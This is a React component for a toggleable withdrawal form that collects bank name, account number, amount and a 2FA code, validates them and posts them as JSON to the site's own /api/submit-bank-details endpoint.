import { useState } from "react";

export default function BankDetailsForm() {
  const [showForm, setShowForm] = useState(false);
  const [formData, setFormData] = useState({
    bankName: "",
    accountNumber: "",
    amount: "",
    twoFACode: "",
  });

  const [errors, setErrors] = useState({});
  const [submitted, setSubmitted] = useState(false);

  const toggleForm = () => {
    setShowForm(!showForm);
    setSubmitted(false);
    setErrors({});
  };

  const validate = () => {
    let newErrors = {};
    if (!formData.bankName) newErrors.bankName = "Bank name is required";
    if (!formData.accountNumber || !/^\d+$/.test(formData.accountNumber))
      newErrors.accountNumber = "Valid account number is required";
    if (!formData.amount || isNaN(formData.amount) || formData.amount <= 0)
      newErrors.amount = "Valid amount is required";
    if (!formData.twoFACode || formData.twoFACode.length < 4)
      newErrors.twoFACode = "2FA code must be at least 4 characters";
    return newErrors;
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validate();
    setErrors(validationErrors);
    if (Object.keys(validationErrors).length > 0) return;

    try {
      const response = await fetch("/api/submit-bank-details", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setSubmitted(true);
        setFormData({ bankName: "", accountNumber: "", amount: "", twoFACode: "" });
      } else {
        const result = await response.json();
        alert(result.message || "Failed to submit.");
      }
    } catch (error) {
      alert("Error submitting form.");
    }
  };

  return (
    <div className="relative z-50">
      <button
        onClick={toggleForm}
        className="bg-green-400 text-black px-6 py-3 rounded-md font-bold flex items-center gap-2 shadow-md"
      >
        <span>🏦</span>
        <span>BANK DETAILS</span>
        <span>▶</span>
      </button>

      {showForm && (
        <div className="absolute top-16 left-0 bg-gray-200 p-6 rounded-md w-[500px] shadow-lg z-50">
          <form onSubmit={handleSubmit} className="space-y-4 text-black">
            <div>
              <label className="font-semibold">Bank Name</label>
              <input
                type="text"
                name="bankName"
                value={formData.bankName}
                onChange={handleChange}
                className="w-full mt-1 p-2 rounded bg-gray-400 placeholder:text-gray-700 shadow"
                placeholder="Enter your bank name"
              />
              {errors.bankName && (
                <p className="text-red-600 text-sm mt-1">{errors.bankName}</p>
              )}
            </div>

            <div>
              <label className="font-semibold">Account Number</label>
              <input
                type="text"
                name="accountNumber"
                value={formData.accountNumber}
                onChange={handleChange}
                className="w-full mt-1 p-2 rounded bg-gray-400 placeholder:text-gray-700 shadow"
                placeholder="Enter your account number"
              />
              {errors.accountNumber && (
                <p className="text-red-600 text-sm mt-1">{errors.accountNumber}</p>
              )}
            </div>

            <div>
              <label className="font-semibold">Amount</label>
              <input
                type="text"
                name="amount"
                value={formData.amount}
                onChange={handleChange}
                className="w-full mt-1 p-2 rounded bg-gray-400 placeholder:text-gray-700 shadow"
                placeholder="Enter amount to withdraw"
              />
              {errors.amount && (
                <p className="text-red-600 text-sm mt-1">{errors.amount}</p>
              )}
            </div>

            <div>
              <label className="font-semibold">Enter 2FA Code</label>
              <input
                type="password"
                name="twoFACode"
                value={formData.twoFACode}
                onChange={handleChange}
                className="w-full mt-1 p-2 rounded bg-gray-400 placeholder:text-gray-700 shadow"
                placeholder="Enter your 2FA Code"
              />
              {errors.twoFACode && (
                <p className="text-red-600 text-sm mt-1">{errors.twoFACode}</p>
              )}
            </div>

            <div className="flex justify-between items-center mt-4">
              <button
                type="button"
                onClick={toggleForm}
                className="bg-gray-500 text-white px-4 py-2 rounded"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="bg-green-600 text-white px-4 py-2 rounded font-semibold"
              >
                Submit
              </button>
            </div>

            {submitted && (
              <p className="text-green-600 mt-3 font-medium">Form submitted successfully!</p>
            )}
          </form>
        </div>
      )}
    </div>
  );
}
